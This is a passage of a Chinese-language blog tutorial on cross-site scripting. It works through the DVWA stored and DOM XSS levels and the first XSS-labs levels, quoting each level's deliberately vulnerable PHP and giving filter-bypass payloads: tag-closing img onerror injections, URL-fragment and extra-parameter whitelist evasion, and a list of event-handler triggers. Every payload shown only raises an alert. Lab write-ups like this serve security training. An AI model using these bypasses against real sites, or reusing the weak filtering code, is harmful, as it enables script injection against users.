class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li><code>trim(string,charlist)</code>​ ：移除字符串两侧的空白字符或其他预定义字符</li><li><code>stripslashes(string)</code>​： 删除反斜杠”&#x2F;“</li><li><code>mysqli_real_escape_string(string,connection)</code>​ ：函数会对字符串string中的特殊符号（<code>\x00</code>​，<code>\n</code>​，<code>\r</code>​，<code>\</code>​，<code>&#39;</code>​，<code>&quot;</code>​，<code>\x1a</code>​）进行转义。</li></ul><p> Message处输入<code>&lt;script&gt;alert(&#39;芜湖&#39;)&lt;/script&gt;</code>​</p><p> <img src="/assets/image-20240408220855-03mid75.png" alt="image">​</p><p> Name处输入<code>&lt;script&gt;alert(&#39;芜湖&#39;)&lt;/script&gt;</code>​</p><p> <img src="/assets/image-20240408221122-7xezy34.png" alt="image">​</p><p> 两个都输入<code>&lt;script&gt;alert(&#39;芜湖&#39;)&lt;/script&gt;</code>​则会弹出两次警告,这里不再赘述</p><h4 id="Medium级别-1"><a href="#Medium级别-1" class="headerlink" title="Medium级别"></a>Medium级别</h4><p> 源码：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li><code>addslashes(string)</code>​ ：函数返回在预定义字符之前添加反斜杠的字符串，预定义字符 <code>&#39;</code>​ 、<code>&quot;</code>​ 、<code>\</code>​ 、<code>NULL</code>​</li><li><code>strip_tags(string)</code>​ ：函数剥去string字符串中的 HTML、XML 以及 PHP 的标签。</li><li><code>htmlspecialchars(string)</code>​： 把预定义的字符 <code>&lt;</code>​ 、 <code>&gt;</code>​ 、<code>&amp;</code>​ 、<code>&#39;</code>​、<code>&quot;</code>​ 转换为 HTML 实体，防止浏览器将其作为HTML元素。</li></ul><p> 这里对<code>$message</code>​做了严格过滤，目前找不到绕过方法，但是对<code>$name</code>​只过滤了<code>&lt;script&gt;</code>​标签，所以可以对其进行反射型XSS中的Medium级别的操作 ，过程不再赘述</p><h4 id="High级别-1"><a href="#High级别-1" class="headerlink" title="High级别"></a>High级别</h4><p> 源码：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p> 这与刚才的Medium级别类似，对<code>$message</code>​做出了严格过滤，但是对<code>$name</code>​只进行了正则过滤，所以此时就可以采用反射型XSS中的High级别操作</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><h4 id="Low级别-2"><a href="#Low级别-2" class="headerlink" title="Low级别"></a>Low级别</h4><p> 源码：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># No protections, anything goes</span><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p> 啥都没有直接传参</p><p> <img src="/assets/image-20240408231047-rdh6tux.png" alt="image">​</p><h4 id="Medium级别-2"><a href="#Medium级别-2" class="headerlink" title="Medium级别"></a>Medium级别</h4><p> 源码：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>];<br>  <br>    <span class="hljs-comment"># Do not allow script tags</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span> (<span class="hljs-variable">$default</span>, <span class="hljs-string">&quot;&lt;script&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p> 这里对<code>&lt;script&gt;</code>​标签进行了过滤，这里按照之前的思路输入<code>&lt;img src=1 onerror=alert(&#39;wuhu&#39;)&gt;</code>​</p><p> 发现没有反应,此时查看页面代码</p><p> <img src="/assets/image-20240408233923-44w2vl3.png" alt="image">​</p><p> 发现构造的语句已经被插入到了value当中，不能成功执行的原因是<strong>select标签中只允许内嵌option标签</strong>，而option标签是不能嵌套构造的img标签的，因此需要先将前面的select标签和option标签都闭合后才能使用img标签。</p><p> 这里输入<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 οnerrοr=alert(&#39;芜湖&#39;)&gt;</code>​</p><p> <img src="/assets/image-20240409000548-y72hyya.png" alt="image">​</p><h4 id="High级别-2"><a href="#High级别-2" class="headerlink" title="High级别"></a>High级别</h4><p> 源码：</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br><br>    <span class="hljs-comment"># White list the allowable languages</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;French&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;English&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;German&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Spanish&quot;</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p> 此处使用了白名单过滤，只允许传的 default值为 French English German Spanish 其中一个</p><p> 所以输入时必须包含其中之一</p><p> 方法一:</p><p> 绕过服务器端的处理</p><p> 直接在本地运行构造的语句，可以通过<code>#</code>​来注释掉之后的内容,因为<strong>url栏中的</strong>​ <strong>​<code>#</code>​</strong> ​<strong>之后的内容不会被发送到服务器当中去，不会经过JS的过滤，只在客户端显示，可以直接与浏览器进行交互。</strong></p><p> 此时输入<code>English#&lt;script&gt;alert(&#39;芜湖&#39;)&lt;/script&gt;</code>​</p><p> <img src="/assets/image-20240409001719-z7fi2qe.png" alt="image">​</p><p> 方法二:</p><p> 双参数绕过(即使用<code>&amp;</code>​拼接另一个参数)</p><p> 此时输入<code>English&amp;=&lt;script&gt;alert(&#39;芜湖&#39;)&lt;/script&gt;</code>​</p><p> <img src="/assets/image-20240409002343-dlbzmi3.png" alt="image">​</p><p> 有些浏览器会对<code>javascript:要执行的语句</code>​进行屏蔽</p><p> 此时可以用<code>onclick</code>​事件触发例如<code>1&#39; onclick=&quot;alert(1)&quot;</code>​</p><p> <strong>其中</strong>​<strong>​<code>alert</code>​</strong>​<strong>可以替换为</strong>​<strong>​<code>confirm</code>​</strong>​<strong>和</strong>​<strong>​<code>prompt</code>​</strong>​ <strong>，并且当输出字符时，括号内的</strong>​ <strong>​<code>&quot;&quot;</code>​</strong> ​<strong>可以换为</strong>​ <strong>​<code>&#39;&#39;</code>​</strong> ​<strong>或者</strong>​ <strong>​<code>//</code>​</strong> ​</p><p> <code>onclick</code>​可以替换为</p><ol><li><p><code>onmouseover</code>​：当鼠标悬停在元素上时触发。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(&quot;</span><span class="hljs-attr">Hacked</span>&quot;)&quot;&gt;</span>&#x27;&gt;what do you see?<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240327123157-y8micjy.png" alt="image">​</p></li><li><p><code>onkeydown</code>​：当按下键盘按键时触发。（点击链接后再按键盘任意一个键）</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onkeydown</span>=<span class="hljs-string">&quot;alert(&quot;</span><span class="hljs-attr">Hacked</span>&quot;)&quot;&gt;</span>&#x27;&gt;what do you see?<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240327123421-ph05pvp.png" alt="image">​</p></li><li><p><code>onfocus</code>​：链接获得焦点时触发。（点击链接触发）</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;alert(&quot;</span><span class="hljs-attr">Hacked</span>&quot;)&quot;&gt;</span>&#x27;&gt;what do you see?<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240327123040-tt5zdnw.png" alt="image">​</p></li><li><p><code>onblur</code>​：链接失去焦点时触发。（点一下链接再点一下空白页面）</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">&quot;alert(&quot;</span><span class="hljs-attr">Hacked</span>&quot;)&quot;&gt;</span>&#x27;&gt;what do you see?<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240327123004-553nr7c.png" alt="image">​</p></li><li><p><code>onerror</code>​</p><p> <img src="/assets/image-20240327125734-7t3t8w5.png" alt="image">​</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dom&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>&gt;&#x27;&gt;what do you see?<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240327125141-ryqrjs0.png" alt="image">​</p></li><li><p><code>onsubmit</code>​：当表单提交时触发。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;alert(&#x27;Hacked&#x27;)&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><code>onload</code>​：当页面或元素加载完成时触发。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(&#x27;Hacked&#x27;)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><code>onchange</code>​：当元素的值发生改变时触发（通常用于表单元素）。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">onchange</span>=<span class="hljs-string">&quot;alert(&#x27;Hacked&#x27;)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol></li><li><h2 id="XSS-labs"><a href="#XSS-labs" class="headerlink" title="XSS-labs"></a>XSS-labs</h2><ol><li><p>无任何过滤</p><p> <code>&lt;script&gt;alert()&lt;/script&gt;</code>​</p><p> <img src="/assets/image-20240811180825-k6kqrxk.png" alt="image">​</p><p> <img src="/assets/image-20240811180913-1gkycgu.png" alt="image">​</p></li><li><p>输出实体化，但是输入框没有实体化</p><p> <code>&quot;&gt;  &lt;script&gt;alert()&lt;/script&gt;  &lt;&quot;</code>​</p><p> （这里注意对查看的代码鼠标右键然后选择编辑html代码，才可查看真正源码）</p><p> 输出框对<code>&lt;</code>​和<code>&gt;</code>​进行了实体化</p><p> <img src="/assets/image-20240811181306-lrzt049.png" alt="image">​</p><p> 输入框并没有对输入内容进行实体化</p><p> <img src="/assets/image-20240811181348-100nylo.png" alt="image">​</p><p> <img src="/assets/image-20240811181518-2veysxe.png" alt="image">​</p><p> 这里直接闭合符号</p><p> <img src="/assets/image-20240811181641-w5jpv3a.png" alt="image">​</p></li><li><p>对输入输出均进行了实体化，利用标签事件，并使用单引号闭合</p><p> <code>&#39; οnfοcus=javascript:alert() &#39;</code>​</p><p> <img src="/assets/image-20240811181824-uu47y9j.png" alt="image">​</p><p> <img 